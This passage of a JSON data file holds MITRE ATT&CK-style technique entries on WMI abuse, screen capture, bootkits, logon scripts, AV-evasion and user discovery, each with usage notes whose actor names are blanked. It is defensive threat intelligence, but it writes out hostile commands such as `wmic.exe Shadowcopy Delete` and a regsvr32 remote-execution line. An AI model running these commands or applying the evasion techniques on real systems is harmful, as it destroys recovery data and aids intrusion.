{
  "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6": {
    "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
    "example_uses": [
      "The author of  submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.",
      "apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.",
      "Find-AVSignature AntivirusBypass module can be used to locate single byte anti-virus signatures.",
      "has been known to remove indicators of compromise from tools.",
      "Analysis of  has shown that it regularly undergoes technical improvements to evade anti-virus detection.",
      "Based on comparison of  versions,  made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.",
      "has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.",
      "includes a capability to modify the \"beacon\" payload to eliminate known signatures or unpacking methods.",
      "has updated and modified its malware, resulting in different hash values that evade detection."
    ],
    "id": "T1066",
    "name": "Indicator Removal from Tools",
    "similar_words": [
      "Indicator Removal from Tools"
    ]
  },
  "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055": {
    "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being disabled by default on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",
    "example_uses": [
      "has used WMI for execution.",
      "A  tool can use WMI to execute a binary.",
      "collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).",
      "uses WMI to perform discovery techniques.",
      "uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.",
      "can use WMI to execute commands.",
      "installer uses WMI to search for antivirus display names.",
      "uses WMI to perform process monitoring.",
      "uses various WMI queries to check if the sample is running in a sandbox.",
      "has used WMI for execution.",
      "malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.  has also used WMIC during and post compromise cleanup activities.",
      "Invoke-WmiCommand CodeExecution module uses WMI to execute and retrieve the output from a  payload.",
      "can use WMI queries to retrieve data from compromised hosts.",
      "may use WMI when collecting information about a victim.",
      "The  dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.",
      "can use WMI to deliver a payload to a remote host.",
      "uses a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.",
      "A  2 plug-in uses WMI to gather victim host details.",
      "can use WMI queries to gather system information.",
      "is capable of running WMI queries.",
      "malware gathers system information via Windows Management Instrumentation (WMI).",
      "malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.",
      "used WMI to steal credentials and execute backdoors at a future time.",
      "The  group is known to utilize WMI for lateral movement.",
      "can use WMI to execute PowerShell commands on a compromised machine.",
      "can use `wmic.exe` as part of its effort to delete shadow copies.",
      "has used  for lateral movement via WMI.",
      "has used a modified version of pentesting script wmiexec.vbs which logs into a remote machine using WMI.",
      "used the WMI query Select * From Win32_SystemDriver to retrieve a driver listing.",
      "During  the threat actors used `wmic` and `rundll32` to load  onto a target host.",
      "can use WMI to open a Windows command shell on a remote machine.",
      "uses WMIC to identify anti-virus products installed on the victims machine and to obtain firewall details.",
      "has used WMI to execute powershell.exe.",
      "has used WMI to execute scripts used for discovery.",
      "can use WMI to delete files on a target machine.",
      "One variant of  uses WMI queries to gather information.",
      "used WMI to deploy their tools on remote machines and to gather information about the Outlook process.",
      "has executed PowerShell scripts via WMI.",
      "has used malware that leveraged WMI for execution and querying host information.",
      "has used wmi queries to gather information from the system.",
      "has a number of modules that use WMI to execute tasks.",
      "can use WMI to gather system information and to spawn processes for code injection.",
      "has used WMI and LDAP queries for network discovery and to move laterally.  has also used batch scripts to leverage WMIC to deploy ransomware.",
      "can use WMI to gather AV products installed on an infected host.",
      "has used WMI to gather information about the system.",
      "used WMI with an explorer.exe token to execute on a remote share.",
      "has used WMI calls for script execution and system profiling.",
      "leverages WMI to enumerate anti-virus on the victim.",
      "has used WMI to install malware on targeted systems.",
      "used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.",
      "has leveraged WMIC including for execution and remote system discovery.",
      "can use WMIC to execute scripts on targeted hosts.",
      "will leverage COM objects accessed through WMI during execution to evade detection.",
      "has used wmic.exe to set environment variables.",
      "can use WMI for lateral movement.",
      "has used WMIC.exe for lateral movement.",
      "can use WMI to move laterally.",
      "has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.",
      "has used WMI to discover network connections and configurations.  has also used the Win32_Process class to execute a malicious DLL.",
      "utilizes wmic to delete shadow copies.",
      "can use Windows Mangement Instrumentation (WMI) calls to execute operations.",
      "can perform WMI commands on the system.",
      "can use `wmic.exe` to delete shadow copies on compromised networks.",
      "can use wmic to help propagate itself across a network.",
      "has used s WMIexec module for remote code execution and VBScript to run WMI queries.",
      "has used the WMI command-line (WMIC) utility to run tasks.",
      "executes received commands with wmic.exe (for WMI commands).",
      "used a VBA script to execute WMI.",
      "can execute remote commands using Windows Management Instrumentation.",
      "wmiexec module can be used to execute commands through WMI.",
      "has used WMIC to execute commands on remote computers.",
      "can query the WMI class `Win32_ComputerSystem` to gather information.",
      "uses WMI to query the Windows Registry.",
      "uses WMI to help propagate itself across a network.",
      "has used WMI to query targeted systems for security products.",
      "can use WMI to create a new process on a remote machine via `C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\\\regsvr32.exe /s /iC:\\windows\\<filename>.dll`.",
      "can use WMI to delete volume shadow copies.",
      "has used WMI to execute binaries.",
      "can use WMI to monitor for and kill specific processes listed in its configuration file.",
      "During  the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version.",
      "uses WMIC to execute payloads.",
      "can use WMI queries to obtain system information.",
      "can use `WMI` queries to detect the presence of a virtual machine environment.",
      "During   used Windows Management Instrumentation (WMI) to move laterally via .",
      "has used WMI to execute files over the network.",
      "During   used WMIC to executed a remote XSL script.",
      "uses wmic.exe to delete shadow copies.",
      "has used wmic.exe for local discovery information.",
      "has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.",
      "During the  WMI in scripts were used for remote execution and system surveys.",
      "has attempted to execute with WMIC.",
      "has used WMI to attempt to delete the shadow volumes on a machine and to connect a virtual machine to the network domain of the victim organization's network.",
      "During  threat actors has used WMI to execute commands.",
      "has used WMI to collect information about target machines.",
      "has used WMI to automate the remote execution of PowerShell scripts.",
      "has the ability to use WMI to delete volume shadow copies.",
      "has used WMI to execute scripts for post exploit document collection.",
      "can utilize WMI to collect system information create new processes and run malicious PowerShell scripts on a compromised machine.",
      "droppers have used WMI classes to execute  commands.",
      "During the   used WMI for the remote execution of files for lateral movement.",
      "can use WMI for execution.",
      "can execute WMI queries to gather information.",
      "searches for anti-virus software and firewall products installed on the victims machine using WMI.",
      "can execute a WMI query to gather information about the installed antivirus engine.",
      "has used WMIC to execute remote commands.",
      "can use WMI to delete Shadow Volumes.",
      "During  the threat actors used `wmiexec.vbs` to run remote commands.",
      "has utilized `WMI` to execute commands and move laterally on compromised Windows machines.",
      "can use wmic process call create in a scheduled task to launch plugins and for execution.",
      "has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.",
      "has used a tool to run `cmd /c wmic computersystem get domain` for discovery.",
      "can use WMI for execution on a compromised host.",
      "can use `wmic` to gather information from a system.",
      "obtains a list of running processes through WMI querying.",
      "used WMI in several ways including for execution of commands via WMIEXEC as well as for persistence via .",
      "During  the threat actors used WMIC to modify administrative settings on both a local and a remote host likely as part of the first stages for their lateral movement; they also used WMI Provider Host (`wmiprvse.exe`) to execute a variety of encoded PowerShell scripts using the `DownloadString` method.",
      "can use WMI to log into remote machines for propagation.",
      "malicious spearphishing payloads use WMI to launch malware and spawn `cmd.exe` execution.  has also used WMIC and the  suite for lateral movement as well as during and post compromise cleanup activities.",
      "collects various information via WMI requests including CPU information in the Win32_Processor entry (Processor ID Name Manufacturer and the clock speed).",
      "has used WMIC to deploy ransomware.",
      "has used WMI to execute scripts used for discovery and for determining the C2 IP address.",
      "can utilize WMI to install new Grunt listeners through XSL files or command one-liners.",
      "uses WMI queries to query system information on victim hosts.",
      "has leveraged WMIC for execution remote system discovery and to create and use temporary directories.",
      "has the ability to use wmic.exe to spread to multiple endpoints within a compromised environment.",
      "can execute via LNK containing a command to run a legitimate executable such as wmic.exe to download a malicious Windows Installer (MSI) package.",
      "used WMI for lateral movement in victim environments.",
      "can use WMI queries for discovery on the victim host.",
      "During  threat actors used WMI to modify Windows Defender settings.",
      "has used WMI execution with password hashes for command execution and lateral movement.",
      "has used WMI in malicious email infection chains to facilitate the installation of remotely-hosted files.",
      "used WMI in several ways including for execution of commands via WMIEXEC as well as for persistence via .  has executed files through Windows Management Instrumentation (WMI).",
      "used the `wmiexec.py` tool within  for remote process execution via WMI.",
      "has used Windows Management Instrumentation (WMI) to query anti-virus products.",
      "has used WMI to execute files over the network and to obtain information about the domain.",
      "uses WMI to query information about the victim operating system.",
      "has used WMI to enable lateral movement.",
      "`wmiexec` module can be used to execute commands through WMI.",
      "can use wmic.exe to delete volume shadow copies.",
      "used WMI to delete Volume Shadow Copies on victim machines."
    ],
    "id": "T1047",
    "name": "Windows Management Instrumentation",
    "similar_words": [
      "Windows Management Instrumentation"
    ]
  },
  "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8": {
    "description": "~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed.\n\nMac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling ~/.bash_profile each time instead of ~/.bashrc.\n\nThese files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell  (Citation: amnesia malware).",
    "example_uses": [],
    "id": "T1156",
    "name": ".bash_profile and .bashrc",
    "similar_words": [
      ".bash_profile and .bashrc"
    ]
  },
  "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688": {
    "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)",
    "example_uses": [
      "is capable of taking screen captures.",
      "captured screenshots and desktop video recordings.",
      "performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.",
      "captures screenshots based on specific keywords in the window’s title.",
      "has a tool called CANDYKING to capture a screenshot of user's desktop.",
      "has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).",
      "has the capability to capture screenshots.",
      "captures screenshots of the victim’s screen.",
      "can capture screenshots of the desktop over multiple monitors.",
      "is capable of taking an image of and uploading the current desktop.",
      "takes screenshots of the user's desktop.",
      "takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.",
      "has the capability to take screenshots of the victim’s machine.",
      "collects screenshots of the victim machine.",
      "can take screenshots.",
      "captures screenshots of the infected system.",
      "can capture screenshots of the victim’s machine.",
      "took screen shots using their Windows malware.",
      "can capture desktop screenshots in the PNG format and send them to the C2 server.",
      "has a command named $screenshot that may be responsible for taking screenshots of the victim machine.",
      "can perform screen captures of the victim’s machine.",
      "can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.",
      "captures the content of the desktop with the screencapture binary.",
      "can capture the victim's screen.",
      "can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.",
      "Get-TimedScreenshot Exfiltration module can take screenshots at regular intervals.",
      "can capture screenshots.",
      "is capable of performing screen captures.",
      "is capable of capturing screenshots.",
      "includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.",
      "is capable of taking screenshots.",
      "A  variant takes screenshots by simulating the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.",
      "can perform screen capturing.",
      "can retrieve screenshots from compromised hosts.",
      "has used a tool to capture screenshots.",
      "is capable of performing screen captures.",
      "can take screenshots.",
      "can capture a screenshot from a victim.",
      "malware can take a screenshot and upload the file to its C2 server.",
      "contains a command to perform screen captures.",
      "has the ability to obtain screenshots of the compromised system.",
      "has a command to take a screenshot and send it to the C2 server.",
      "\"beacon\" payload is capable of capturing screen shots.",
      "takes periodic screenshots and exfiltrates them.",
      "is capable of taking screenshots.",
      "contains a module that captures screenshots of the victim's desktop.",
      "can obtain screenshots from the victim.",
      "can take regular screenshots when certain applications are open that are sent to the command and control server.",
      "has the ability to initiate keylogging and screen captures.",
      "has the capability to capture screenshots.",
      "can capture screenshots at a configurable interval.",
      "contains screen capture functionality.",
      "can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.",
      "can take a desktop screenshot and save the file into \\ProgramData\\Mail\\MailAg\\shot.png.",
      "captured screenshots and sent them out to a C2 server.",
      "can capture screenshots.",
      "can capture screenshots.",
      "contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.",
      "takes screenshots of the compromised system's desktop and saves them to C:\\system\\screenshot.bmp for exfiltration every 60 minutes.",
      "Malware used by  is capable of watching the victim's screen.",
      "has used tools to take screenshots from victims.",
      "has used a screenshot module that can be used to take a screenshot of the remote system.",
      "A  variant takes screenshots by simulating the user pressing the Take Screenshot key (VK_SCREENSHOT) accessing the screenshot saved in the clipboard and converting it to a JPG image.",
      "can capture screenshots of the victims desktop.",
      "has performed screen captures of victims including by using a tool scr.exe (which matched the hash of ScreenUtil).",
      "has a feature to perform screen capture.",
      "can take screenshots every 30 seconds as well as when an external removable storage device is connected.",
      "can capture a screenshot of the current screen.",
      "has the ability to capture screenshots.",
      "can take screen shots of a compromised machine.",
      "is capable of capturing screenshots on Windows and macOS systems.",
      "has the ability to capture screenshots on compromised hosts.",
      "has a command to periodically take screenshots of the system.",
      "has used Apples Core Graphic APIs such as `CGWindowListCreateImageFromArray` to capture the user's screen and open windows.",
      "can take screenshots and send them to an actor-controlled C2 server.",
      "can capture screenshots of the victims machines.",
      "has the ability to take screenshots.",
      "malware can take screenshots of the compromised computer every minute.",
      "can take a screenshot of the desktop.",
      "A variant of  captures screenshots of the victims machine in JPEG and BMP format.",
      "has the ability to take screenshots on an infected host including capturing content from windows of instant messaging applications.",
      "Beacon payload is capable of capturing screenshots.",
      "has the ability to capture the victim's screen.",
      "can capture screenshots of not only the entire screen but of each separate window open in case they are overlapping.",
      "can take a screenshot of the current desktop.",
      "can take a screenshot on the infected system.",
      "can take screenshots of the victims machine.",
      "has used plugins to take screenshots on targeted systems.",
      "can capture screenshots from a compromised host.",
      "can take screenshots on compromised hosts.",
      "has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines.",
      "can take system screenshots and save them to `%AppData%`.",
      "captures screenshots in .jpg format and then exfiltrates them.",
      "has the ability to take screenshots on a compromised host.",
      "can take JPEG screenshots of an infected system.",
      "can take screenshots on targeted systems.",
      "has used malware that can capture screenshots of the victims machine.",
      "has a plugin that captures screenshots of the target applications.",
      "can capture victim screen activity.",
      "can take and save screenshots.",
      "can take a screenshot from an infected host.",
      "has the ability to take screen captures.",
      "can perform screen captures of the victims machine.",
      "has used hooked APIs to take screenshots.",
      "has the ability to take a screenshot of the infected host desktop using Windows GDI+.",
      "can take desktop screenshots.",
      "can capture screenshots and store them locally.",
      "can take a screenshot of the target machine and save it to a file.",
      "has the ability to capture screenshots on the infected host.",
      "can take screenshots of the victims active display.",
      "is capable of capturing screenshots of the victim's machine.",
      "The  ScreenCap component can take screenshots on a compromised host.",
      "has used a screen capture utility to take screenshots on a compromised host.",
      "takes automated screenshots of the infected machine.",
      "can load a module to call `CreateCompatibleDC` and `GdipSaveImageToStream` for screen capture.",
      "captures PNG screenshots of the main screen.",
      "can capture the victims screen remotely.",
      "captures screenshots of the victims screen.",
      "can collect screenshots of the victims machine.",
      "takes screenshots every 90 seconds by calling the Gdi32.BitBlt API.",
      "allows the operator to capture screenshots.",
      "has a command to perform screen grabbing.",
      "contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList CGDisplayCreateImage and NSImage:initWithCGImage methods.",
      "can capture screenshots of the victims machine.",
      "can take screenshots on remote hosts.",
      "can capture screenshots of the infected system using the `gdi32` library.",
      "has a plugin for screen capture.",
      "can take screenshots on a compromised host by calling a series of APIs.",
      "takes screenshots of windows of interest.",
      "has the ability to capture screenshots and webcam photos.",
      "can take screenshots of the desktop and target application windows saving them to user directories as one byte XOR encrypted .dat files.",
      "can capture display screenshots with the screens_dll.dll plugin.",
      "has captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop and then once every five minutes thereafter.",
      "has taken a screenshot of a victim's desktop named it Filter3.jpg and stored it in the local directory.",
      "can capture screenshots of the infected machine.",
      "has the capability to take screenshots of the victims machine.",
      "can take screenshots on a compromised host.",
      "took screenshots using their Windows malware.",
      "has the ability to view the screen on compromised hosts.",
      "has the ability to do real time screen viewing on an infected host.",
      "captures screenshots based on specific keywords in the windows title.",
      "can take screenshots of the victim machine.",
      "saves a screen capture of the victim's system with a numbered filename and .jpg extension. Screen captures are taken at specified intervals based on the system.",
      "has taken screenshots every five minutes and saved them to the user's local Application Data folder under `Temp\\SymbolSourceSymbols\\icons` or `Temp\\ModeAuto\\icons`.",
      "captures screenshots.",
      "can capture screenshots that are initially saved as scr.jpg.",
      "can run `screencapture` to collect screenshots from compromised hosts.",
      "delivered PowerShell scripts capable of taking screenshots of victim machines.",
      "has obtained a screenshot of the victim's system using the gdi32.dll and gdiplus.dll libraries.",
      "can take screenshots of the victim desktop.",
      "can capture screenshots from victim systems.",
      "can capture screenshots from compromised hosts.",
      "can capture screenshots on targeted systems using a timer and either upload them or store them to disk.",
      "can capture screenshots on compromised hosts.",
      "can capture screenshots from victim machines.",
      "has taken screenshots of victim machines.",
      "uses Apple's built-in AVFoundation Framework library to access the user's camera and screen. It uses the `AVCaptureStillImage` to take a picture using the user's camera and the `AVCaptureScreen` to take a screenshot or record the user's screen for a specified period of time.",
      "has used malware such as GHAMBAR and POWERPOST to take screenshots.",
      "allows for the remote administrator to take screenshots of the running system.",
      "has the ability to capture screenshots of new browser tabs based on the presence of the `Capture` flag.",
      "has captured browser screenshots using ."
    ],
    "id": "T1113",
    "name": "Screen Capture",
    "similar_words": [
      "Screen Capture"
    ]
  },
  "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d": {
    "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
    "example_uses": [
      "Some  variants incorporate an MBR rootkit.",
      "is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.",
      "is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.",
      "malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.",
      "has deployed a bootkit along with  to ensure its persistence on the victim. The bootkit shares code with some variants of ."
    ],
    "id": "T1067",
    "name": "Bootkit",
    "similar_words": [
      "Bootkit"
    ]
  },
  "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334": {
    "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
    "example_uses": [
      "An  loader Trojan adds the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.",
      "has registered a Windows shell script under the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.",
      "has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup.",
      "Depending on the Linux distribution and when executing with root permissions  may install persistence using a `.conf` file in the `/etc/init/` folder.",
      "has installed an init.d startup script to maintain persistence.",
      "used a hidden shell script in `/etc/rc.d/init.d` to leverage the `ADORE.XSEC`backdoor and `Adore-NG` rootkit.",
      "used malicious boot scripts to install the  backdoor on victim devices."
    ],
    "id": "T1037",
    "name": "Boot or Logon Initialization Scripts",
    "similar_words": [
      "Logon Scripts",
      "Boot or Logon Initialization Scripts"
    ]
  },
  "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104": {
    "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Various utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",
    "example_uses": [
      "used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.",
      "can identify logged in users across the domain and views user sessions.",
      "gathers the username from the victim’s machine.",
      "collects registered owner details by using the commands systeminfo and net config workstation.",
      "can gather the username from the victim’s machine.",
      "collects the victim's username.",
      "identifies the victim username.",
      "used the command query user on victim hosts.",
      "collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.",
      "gathers the victim username.",
      "collects the username from the victim’s machine.",
      "collects the victim username along with other account information (account type, description, full name, SID and status).",
      "lists local users and session information.",
      "runs whoami on the victim’s machine.",
      "has the capability to gather the username from the victim's machine.",
      "gathers information on users.",
      "has the capability to collect the current logged on user’s username from a machine.",
      "obtains the victim username and encrypts the information to send over its C2 channel.",
      "collects the victim’s username and whether that user is an admin.",
      "gathers user names from infected hosts.",
      "runs the whoami and query user commands.",
      "collects the victim’s username.",
      "executes the whoami on the victim’s machine.",
      "can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.",
      "can collect the victim user name.",
      "can obtain the victim user name.",
      "can gather information on the victim username.",
      "collects the username from the victim.",
      "collects the victim username and sends it to the C2 server.",
      "may collect information about the currently logged in user by running whoami on a victim.",
      "malware has obtained the victim username and sent it to the C2 server.",
      "collects the current username and sends it to the C2 server.",
      "has run whoami on a victim.",
      "collects the victim's username.",
      "obtains the current user's security identifier.",
      "A Linux version of  checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges.  also gathers the username of the victim.",
      "uses NetUser-GetInfo to identify that it is running under an “Admin” account on the local system.",
      "collects the current username from the victim.",
      "has used Meterpreter to enumerate users on remote systems.",
      "sends the logged-on username to its hard-coded C2.",
      "can obtain information about the victim usernames.",
      "runs tests to determine the privilege level of the compromised user.",
      "obtains the victim username and saves it to a file.",
      "The OsInfo function in  collects the current running username.",
      "can obtain the victim username and permissions.",
      "gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.",
      "has commands to get the current user's name and SID.",
      "contains the getInfoOSX function to return the OS X version as well as the current user.",
      "obtains the victim username.",
      "A module in  collects information from the victim about the current user name.",
      "can obtain information about the logged on user both locally and for Remote Desktop sessions.",
      "can obtain information about the current user.",
      "collects the account name of the logged-in user and sends it to the C2.",
      "can gather the victim user name.",
      "A  file stealer can gather the victim's username to send to a C2 server.",
      "collected the victim username and whether it was running as admin, then sent the information to its C2 server.",
      "malware gathers the registered user and primary owner name via WMI.",
      "Various  malware enumerates logged-on users.",
      "An  downloader uses the Windows command \"cmd.exe\" /C whoami to verify that it is running with the elevated privileges of “System.”",
      "can gather information about the user on a compromised host.",
      "sent username computer name and the previously generated UUID in reply to a who command from C2.",
      "gathers the username from the system.",
      "can obtain a list of users from an infected machine.",
      "can identify the user and groups the user belongs to on a compromised host.",
      "has collected the username of the victim system.",
      "can collect the user name from a compromised host.",
      "has enumerated all users connected to network shares.",
      "has identified primary users currently logged in users sets of users that commonly use a system or inactive users.",
      "can list active users on the system.",
      "has executed the whoami command.",
      "can collect the username on the victim machine to send to C2.",
      "can collect the username from the compromised machine.",
      "can collect the username on a compromised host.",
      "can collect the user name from the victim's machine.",
      "has the ability to identify the user name.",
      "has the ability to identify the users on a compromised host.",
      "can retrieve a list of user accounts and usernames from an infected machine.",
      "can collect the username from a compromised host.",
      "collects the user name from the victims machine.",
      "has the ability to identify the username on the compromised host.",
      "has executed the command `quser` to display the session details of a compromised machine.",
      "has run tests to determine the privilege level of the compromised user.",
      "can retrieve the victims username.",
      "has used implants capable of collecting the signed-in username.",
      "runs whoami on the victims machine.",
      "can collect the username from the victims machine.",
      "has used the command `cmd.exe /C quser` to collect user session information.",
      "has the ability to collect the username from an infected host.",
      "has used `whoami` to gather user information.",
      "During   used `whoami` to gather information from victim machines.",
      "can run whoami to identify the system owner.",
      "enumerates the current user during the initial infection.",
      "can detect the username of the infected host.",
      "has the capability to collect the current logged on users username from a machine.",
      "can determine if the current user has admin privileges.",
      "used an HTTP malware variant and a Port 22 malware variant to collect the victims username.",
      "can collect the username on a targeted system.",
      "uses the whoami command.",
      "can identify the user id on a target machine.",
      "can collect the username from a victim machine.",
      "has the ability to discover the username on the infected host.",
      "has the ability to identify the username and hostname on a compromised host.",
      "collected the victim's username and executed the whoami command on the victim's machine.  executed shellcode to collect the username on the victim's machine.",
      "During  threat actors enumerated sessions and users on a remote host and identified privileged users logged into a targeted system.",
      "has the ability to identify the username on a compromised host.",
      "used  to collect usernames from the system.",
      "can identify users registered to a targeted machine.",
      "gets the username from the system.",
      "can identify the user name on a compromised system.",
      "can gather the username from the system.",
      "has collected the username from a victim machine.",
      "can retrieve usernames.",
      "can identify the username on a compromised host.",
      "During  threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.",
      "can check if the current user of a compromised system is an administrator.",
      "can collect the username from the victim's machine.",
      "used letmein to scan for saved usernames on the target system.",
      "has used `whoami` to collect system user information.",
      "has collected the username and UID from the infected machine.",
      "can gather information regarding the user.",
      "During  the threat actors collected `whoami` information via PowerShell scripts.",
      "can obtain logged user information from a compromised machine and can execute the command `whoami.exe`.",
      "collected information on user accounts via the whoami command.",
      "can enumerate the username and account type.",
      "collects the victims username and whether that user is an admin.",
      "can collect the user name of the system.",
      "can collect the owner and organization information from the target workstation.",
      "collects the username from the victims machine.",
      "has collected the username from the infected host.",
      "can collect the username from an infected host.",
      "can identify the user on a targeted system.",
      "can collect the victim username.",
      "can collect the username from the system.",
      "can execute getinfo to identify the username on a compromised host.",
      "During  the threat actors used the `query user` and `whoami` commands as part of their advanced reconnaissance.",
      "can identify the current username on the victim system.",
      "can collect information on user sessions.",
      "has used a tool to capture the username on a compromised host in order to register it with C2.",
      "can gather the username from an infected host.",
      "can collect the user name from a victim's machine.",
      "has the ability to enumerate the infected system's user name.",
      "has the ability to gather user information from the targeted system using `whoami/upn&whoami/fqdn&whoami/logonid&whoami/all`.",
